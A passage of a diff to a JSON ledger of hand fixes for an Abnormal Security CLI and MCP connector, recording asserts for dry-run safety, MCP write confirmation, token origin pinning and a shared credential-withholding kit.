+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "partner-endpoints-pp-cli/config.toml"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Abnormal whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to abnormal from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the liongard 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "inner = dryRunTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/abnormal_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Abnormal: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to abnormal from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the liongard 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/abnormal_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/abnormal_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its output file on every return, including an API error: the open no longer shadows RunE's named err, and the file is written through the credential kit's writer.",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to abnormal from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the liongard 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "active",
+   "summary": "The Authorization bearer token and every API request go only to the scheme, host and port of the configured base URL (https://api.abnormalplatform.com/v1, or ABNORMAL_BASE_URL for the EU host); every redirect hop must stay on that origin, a non-ASCII host never matches, and an unparseable base URL pins nothing (every request refused). Installed on every CLI, novel and MCP client by registerClientHook (internal/cli/abnormal_guard.go), with the response cache off and --dry-run clients refusing every send",
+   "why": "Credential rule host pinning: the generated client sends the bearer header to whatever URL it is handed and its CheckRedirect strips only the named auth headers, so a Location to another host or an absolute path from an MCP argument would carry the token off the vendor API. One origin, taken from the configured base URL; an EU tenant sets ABNORMAL_BASE_URL and the pin follows it.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "func checkPin(pin string, req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "if o := normalizedOrigin(req.URL); o == \"\" || o != pin {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "hc.Transport = originPinTripper{pin: pin, next: inner}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "if u, err := url.Parse(c.BaseURL); err == nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_cred_rules_test.go",
+     "contains": "func TestPinAllowsOnlyTheAPIOrigin(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-real-regional-host",
+   "status": "active",
+   "summary": "doctorShippedBaseURL is empty: Abnormal's shipped base URL is its real US API root, so doctor probes it instead of reporting every healthy install as an unconfigured placeholder",
+   "why": "press-traps s5: the fleet doctor replay restored doctor_verdict.go with doctorShippedBaseURL = \"https://api.abnormalplatform.com/v1\", so doctor printed \"not configured (base_url is a placeholder)\" and skipped the credential probe on every correctly configured US install (published 0.1.5 shipped the same). The template / YOUR_ / reserved-domain rules still apply. TestDoctorProbesTheRealAbnormalHosts was seen failing on the replayed file (seen/doctor-real-host-seen-failing.log). A fleet re-mint of the doctor template would restore the placeholder value: keep this entry.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_real_host_test.go",
+     "contains": "func TestDoctorProbesTheRealAbnormalHosts(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "spec-resource-keys-and-threat-detail",
+   "status": "active",
+   "summary": "spec.json carries x-resource-id on every list whose records have a real key (threats threatId, cases caseId, campaigns campaignId, vendor cases vendorCaseId, vendors vendorDomain, resources resourceId, search activities activity_id, SOAR tokens token_id; audit logs a composite of their required fields) and an x-pp-sync-walker on GET /threats/{threat_id}, keyed per message (threatId+abxMessageIdStr), so sync stores every message of every threat's detail (threats_get) and triage merges them per threat",
+   "why": "4.34.2's ID fallback resolved no key for the threat, case, campaign, vendor-case and vendor lists (they left default sync), picked envelope or display fields for resources (pageNumber), audit logs (pageNumber: a page collapsed into one row) and SOAR tokens (name), and derived no dependent for the threat detail that 4.24 fetched per threat. The threats list returns only {threatId}, so triage scored bare IDs (no attack type, no messages) with every gate green. The walker stores the detail's messages[] one row per message; keyed on threatId a threat's messages collapsed into one row. Spec-encoded (tools/spec_fix.py in the run dir); triage reads threats_get message rows and 4.24 detail docs and keeps one doc per threat with each message once. Seen failing: seen/triage-detail-seen-failing.log, seen/triage-walker-messages-seen-failing.log (prior triage through the real sync), seen/threat-detail-key-collapse-seen-failing.log (per-threat key).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "{Name: \"threats_get\", ParentTable: \"threats\", ParentIDParam: \"threat_id\", PathTemplate: \"/threats/{threat_id}\"",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"threatId\",\n",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"threatId+abxMessageIdStr\",",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"caseId\",\n",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"timestamp+user+category+sourceIp+status\",",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "{Name: \"threats_get\", ParentTable: \"threats\", ParentIDParam: \"threat_id\", PathTemplate: \"/threats/{threat_id}\", KeyField: \"threatId\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"threatId+abxMessageIdStr\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "WHERE resource_type IN ('threats', 'threats_threats', 'threats_get')",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "addMessage(docFor(threatID), m)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage_detail_test.go",
+     "contains": "func TestTriageRanksTheSyncedThreatDetailOncePerThreat(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/triage_sync_test.go",
+     "contains": "func TestTriageRanksThreatsSyncedThroughTheDetailWalker(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "note_onboard": "spec.json stays in the press library (msp-skills ships no spec); the asserts check the generated code the spec extensions produce."
+  },
+  {
+   "id": "spec-raw-json-log-id",
+   "status": "active",
+   "summary": "GET /spm-v2/workflow-logs/{workflow_log_id}/raw-json's duplicate query parameter is named log_id with x-url-name workflow_log_id: the request still carries the ID as path and query, and 4.34.2 no longer refuses the MCP input-name collision",
+   "why": "The vendor spec declares workflow_log_id as both a path and a required query parameter; 4.34.2 refuses to generate (\"MCP input names collide\"). Spec-encoded (tools/spec_fix.py).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "{PublicName: \"log_id\", WireName: \"workflow_log_id\"}",
+     "min_count": 1
+    }
+   ],
+   "note_onboard": "spec.json stays in the press library (msp-skills ships no spec); the asserts check the generated code the spec extensions produce."
+  },
+  {
+   "id": "vendor-example-host-reserved",
+   "status": "active",
+   "summary": "The vendor-risk examples use the RFC 2606 reserved supplier.example.com, not acme-supplies.com (a registrable real domain the 4.34.2 novel-host gate refuses)",
+   "why": "4.34.2 refuses a novel example host no research artifact documents. The research narrative, the spec example and vendor_risk.go's help all use the reserved host (tools/research_fix.py).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/vendor_risk.go",
+     "contains": "vendor-risk supplier.example.com",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/vendor_risk.go",
+     "not_contains": "acme-supplies.com"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "acme-supplies.com"
+    },
+    {
+     "file": "page.json",
+     "not_contains": "acme-supplies.com"
+    },
+    {
+     "file": "pain-point.md",
+     "not_contains": "acme-supplies.com"
+    }
+   ]
+  },
+  {
+   "id": "docs-set-token-reads-stdin",
+   "status": "active",
+   "summary": "README/SKILL say `auth set-token` reads the token from stdin (the narrative's `auth set-token <token>` form does not exist) and name the real config path (~/.config/abnormal-pp-cli/config.toml, not the spec-title slug)",
+   "why": "The research auth narrative (re-rendered by dogfood and shipcheck) told operators to pass the token as an argument, which the 4.34.2 command refuses and which would put it in shell history. Fixed at the source (research.json, tools/research_fix.py) and in the render (tools/apply_docfixes.py).",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "not_contains": "auth set-token <token>"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "abnormal-security-client-pp-cli"
+    },
+    {
+     "file": "guide.md",
+     "contains": "piping it to `abnormal-cli auth set-token`",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "r1-cases-matched-on-their-detail",
+   "status": "active",
+   "summary": "employee-risk and vendor-risk read each listed case's detail (GET /cases/{id}, GET /vendor-cases/{id}, at most 4 at a time) and match on the detail schema's fields (affectedEmployee and an open case_status; vendorDomain); every detail that cannot be read is a fetch failure and the note says open_cases may be incomplete",
+   "why": "Codex r1 class wrong-field-read-from-a-documented-response: spec.json PaginatedCases.cases[] (AbnormalCase) carries no affectedEmployee or case_status and PaginatedVendorCases.vendorCases[] (VendorCases) only vendorCaseId, so both novels always reported open_cases [] (seen/r1-detail-classes-seen-failing.log). One helper, internal/cli/abnormal_case_details.go.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/abnormal_case_details.go",
+     "contains": "func listedCaseDetails(ctx context.Context, c *client.Client, prefix string, ids []string, fail func(source string, err error)) []json.RawMessage {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_case_details.go",
+     "contains": "func caseIsOpen(status string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/employee_risk.go",
+     "contains": "for i, raw := range listedCaseDetails(ctx, c, \"/cases/\", ids, fail) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/vendor_risk.go",
+     "contains": "for i, raw := range listedCaseDetails(ctx, c, \"/vendor-cases/\", ids, fail) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/case_details_test.go",
+     "contains": "func TestRiskNovelsMatchOnTheCaseDetail(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-threat-detail-completeness",
+   "status": "active",
+   "summary": "triage never hides a threat on stored-message evidence: threats whose synced messages are all remediated, and threats older than --since, are listed after the open in-window ones (remediated / in_window fields), never suppressed or dropped",
+   "why": "Codex r1 and r2 class incomplete-threat-detail-read-as-complete: GET /threats/{threat_id} shows at most 10 messages and accepts pageSize (sync --global-param pageSize=1 stores one message), and ThreatDetails.recipientCount counts recipients, not messages, so no count of stored messages proves a campaign complete; a remediated-looking subset suppressed a campaign with an unremediated message. Seen failing first: .review/seen-triage-failing.log (2 threats suppressed).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "item.Remediated = allRemediated\n",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "if it.Remediated && !includeRemediated {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "not_contains": "view.Suppressed++"
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "not_contains": "threatMessagesComplete("
+    },
+    {
+     "file": "cli/internal/cli/triage_detail_test.go",
+     "contains": "func TestTriageNeverHidesAThreatOnStoredMessages(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-empty-case-detail-is-a-failure",
+   "status": "active",
+   "summary": "A case detail with no caseId (null, {}) and a vendor case detail with no vendorCaseId are fetch failures, never \"no match\"",
+   "why": "Codex r2 P2 (fixed after the stop rule): decodeRiskCase accepted null and {}, so an unreadable detail produced no match without a failure or note. Seen failing: seen/r2-poststop-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/employee_risk.go",
+     "contains": "if idText(m[\"caseId\"]) == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/vendor_risk.go",
+     "contains": "if err := json.Unmarshal(raw, &vc); err != nil || vc.VendorCaseID.String() == \"\" {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "skill-http-endpoint-has-path",
+   "class": "docs-accuracy",
+   "summary": "SKILL.md names the HTTP-mode endpoint with its /mcp path (http://127.0.0.1:7777/mcp), not a bare loopback origin that never handshakes",
+   "why": "mcp-go serves Streamable HTTP at /mcp and 404s at the root; check_install_docs.py R3 fails a bare loopback origin. SKILL.md is re-vendored from the press on every reprint, which brings the bare origin back.",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "serves `http://127.0.0.1:7777/mcp` by default,"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "binds `127.0.0.1:7777` by default,"
+    }
+   ]
+  },
+  {
+   "id": "skill-docs-house-style",
+   "class": "docs-accuracy",
+   "summary": "SKILL.md is titled '<Vendor> - Claude Code Skill' and says agent-ready CLI; AGENTS.md says 'Unimplemented stubs' (no TODO marker)",
+   "why": "onboard re-vendors SKILL.md and AGENTS.md from the press on every reprint, which brings back the press title (ci_guards check 8), the banned term agent-native (check_vocabulary) and a TODO token (check_no_todos).",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "# Abnormal Security - Claude Code Skill",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "agent-native CLI"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "Printing Press CLI"
+    },
+    {
+     "file": "AGENTS.md",
+     "not_contains": "TODO stubs"
     }
    ]
   },
@@ -547,6 +869,482 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit, and every early exit of the MCP main returns through it; the API client (client.OutboundGuard), feedback, deliver and probe clients go through credkit.Transport, under the origin pin; every file write outside the 0600 credential store and config goes through the kit (cache, export, deliver, feedback, journal, teach logs, profiles, platform files); the MCP stdio and HTTP servers pass credkit.MCPIn, MCPOut, MCPHTTP and MCPTools; the MCP mirror runs the CLI with credkit.RunCommand. The store and config rewrites go outside the kit (cliutil.AtomicWriteCredentialFile) as declared credential sources. A config or credential file is held with credkit.HoldBody and credkit.HoldURL every time it is read, and the MCP server's --tls-key file is held at startup.",
+   "why": "One contract, one matcher and one set of sinks replace the connector-only copies, and a matcher fix reaches this connector by vendoring. It closes the open review classes: a credential split across two exported records (the export is one kit stream), a short credential in a decoded view, doctor's credentials verdict (no name-based redaction), the env-schema gate (no os.Environ holder), and the MCP HTTP no-token refusal printed before os.Exit (credkit.Exit drains it). Tests: internal/credwire/leak_test.go, on the built binaries, seen failing on the pre-kit HEAD or with the wiring disabled (.review/seen/). Retires secret-echo-decoded-funnel, output-chokepoint, file-sinks-withheld, store-never-keeps-secrets, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, config-file-holds-no-credential, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, secure-container-is-credential, r1-holder-reads-every-part, r1-mixed-byte-escapes-decoded, r1-split-across-deliveries-withheld, held-value-case-folded, output-units-reassembled, preclose-holder-numbers-and-cookies, preclose-escape-fixpoint, preclose-split-across-processes-and-protocol, refuse-held-uses-connector-chokepoint, output-derived-and-scheme-forms-matched-whole, g304-paths-cleaned-not-annotated, r1-short-value-encodings-withheld, r1-file-history-is-the-whole-file, r2-short-value-nested-encodings, response-credentials-held: replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements tools/maintainer/fleet_handfixes.json backs). The kit holds every contract section 1 source at startup and on arrival, and withholds at every sink as one stream, so the connector's own holder, decoded funnel, output chokepoint, file and network writers, SQL withhold driver, store stripping and argv refusal are gone, with their tests.",
+   "spec_encode_followup": "Press-side: generate the kit wiring and the Declarations literal.",
+   "asserts": [
+    {
+     "file": "cli/cmd/abnormal-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "flag.CommandLine.Init(os.Args[0], flag.ContinueOnError)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Files:         credentialFiles,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func HoldConfigFile(data []byte) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.HoldConfigFile(data)",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "HoldConfigFile(data)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "if err := AtomicWriteCredentialFile(path, data, 0o600, 0o700); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(path string, data []byte, fileMode, dirMode os.FileMode) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := cliutil.AtomicWriteCredentialFile(c.Path, data, 0o600, 0o700); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "clone.Transport = guardTransport(tr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "httpClient.Transport = guardTransport(tr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.Transport = guardTransport(tr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.Hold(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.WriteFile(tempName, []byte(scopeHash+\"\\n\"), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return credkit.StartCommand(c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "outKit = credkit.NewWriter(f, credkit.SinkFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "client := &http.Client{Timeout: 15 * time.Second, Transport: credkit.Transport(nil)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if err := credkit.WriteFile(tmp, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "return credkit.WriteFile(path, []byte(strings.Join(kept, \"\\n\")+\"\\n\"), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "f, err := credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "_ = credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "if err := credkit.WriteFile(tmpName, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/ratelimit.go",
+     "contains": "_ = credkit.WriteFile(path, []byte(strconv.FormatInt(time.Now().UnixNano(), 10)), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "next = credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "not_contains": "responseHoldTripper"
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestShortTokenDoubleBase64NeverPrinted(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMalformedConfigHeldBeforeAnythingPrints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestExportSplitAcrossRecordsNeverLandsWhole(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPHTTPWithoutTokenSaysWhy(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestDiscoveryCoversEveryFileLoadReads(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestWholeRunNeverEmitsAHeldCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldTLSKeyFile(keyFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestTLSKeyServesAndItsTextIsHeld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter credsql applies as each connection opens. openReadOnlySQLite runs select 1 because the kit's connection does not forward Ping. The connector's own withholding driver and its stored-secret stripping are gone.",
+   "why": "A statement's text and bound values are a sink of their own, reads included. The kit checks each statement once, against its matcher, so the internal/store suite no longer pays the old per-statement decode (23 s native, over 600 s emulated).",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name, and express the MCP sql value cap as a connection-open setting.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if _, err := db.ExecContext(ctx, \"select 1\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "WithholdingSQLiteDriver"
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing, then credkit.MCPHTTP around a gate that answers the Origin, bearer and body-limit verdicts.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the inner, kit-wrapped handler and only a write-free preflight runs before credkit.MCPHTTP.",
+   "asserts": [
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "kit.ServeHTTP(w, r)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "not_contains": "func rejectMCPHTTPRequest("
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPHTTPRefusalsPassTheKit(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "stdin-body-declared",
+   "class": "credential-kit",
+   "status": "active",
